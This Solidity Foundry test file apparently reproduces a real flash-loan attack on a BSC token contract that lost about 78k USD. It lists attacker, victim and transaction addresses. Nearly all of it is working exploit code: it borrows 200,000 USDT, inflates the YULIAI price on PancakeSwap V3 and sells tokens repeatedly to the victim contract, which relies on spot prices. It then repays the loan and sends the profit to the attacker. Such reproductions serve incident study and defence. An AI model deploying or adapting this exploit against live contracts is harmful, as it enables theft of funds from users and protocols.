// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 78k USD
// Attacker : https://bscscan.com/address/0x26f8bf8a772b8283bc1ef657d690c19e545ccc0d
// Attack Contract : https://bscscan.com/address/0xd6b9ee63c1c360d1ea3e4d15170d20638115ffaa
// Vulnerable Contract : https://bscscan.com/address/0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282
// Attack Tx : https://bscscan.com/tx/0xeab946cfea49b240284d3baef24a4071313d76c39de2ee9ab00d957896a6c1c4

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1955817707808432584
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant YULIAI = 0xDF54ee636a308E8Eb89a69B6893efa3183C2c1B5;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
address constant VICTIM = 0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282;

contract YuliAI is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 57432056 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = USDT_ADDR;
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        vm.deal(address(attackContract), 0.01 ether);
        attackContract.swap(YULIAI, VICTIM, 200_000 ether);
    }
}

contract AttackContract {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    function swap(address tokenIn, address tokenOut, uint256 amountIn) public {
        bytes memory data = abi.encode(tokenIn, tokenOut, amountIn);
        // Step 1: borrow 200,000 USDT from Moolah
        IMoolah(MOOLAH).flashLoan(USDT_ADDR, amountIn, data);

        // Step 6: send USDT to attacker
        IERC20 usdt = IERC20(USDT_ADDR);
        usdt.transfer(owner, usdt.balanceOf(address(this)));
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata userData) public {
        (address yuliai_addr, address victim_addr, uint256 amount) = abi.decode(userData, (address, address, uint256));
        IERC20 usdt = IERC20(USDT_ADDR);
        IERC20 yuliai = IERC20(yuliai_addr);
        Uni_Router_V3 router = Uni_Router_V3(payable(PANCAKE_ROUTER));

        usdt.approve(PANCAKE_ROUTER, type(uint256).max);

        Uni_Router_V3.ExactInputSingleParams memory params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: USDT_ADDR,
            tokenOut: yuliai_addr,
            fee: 10_000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: assets,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        // Step 2: USDT -> yuliai
        router.exactInputSingle(params);

        yuliai.approve(victim_addr, type(uint256).max);
        uint256 yuliaiBalance = yuliai.balanceOf(address(this));

        // Root cause: The victim contract uses YULIAI/USDT V3 pool's spot price for selling YULIAI tokens.
        // Step 3: sell yuliai to victim contract at a higher price
        IVictim victim = IVictim(victim_addr);
        uint256 tokenAmount = 95_638_810_142_121_233_859_331;
        for (uint256 i = 0; i < 40; i++) {
            try victim.sellToken{value: 0.00025 ether}(tokenAmount) {
            } catch {
                break;
            }
        }

        // Step 4: yuliai -> USDT
        yuliai.approve(PANCAKE_ROUTER, type(uint256).max);
        yuliaiBalance = yuliai.balanceOf(address(this));
        params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: yuliai_addr,
            tokenOut: USDT_ADDR,
            fee: 10_000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: yuliaiBalance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        router.exactInputSingle(params);

        // Step 5: pay back the loan
        usdt.approve(MOOLAH, assets);
    }
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IVictim {
    function sellToken(uint256 tokenAmount) payable external;
}
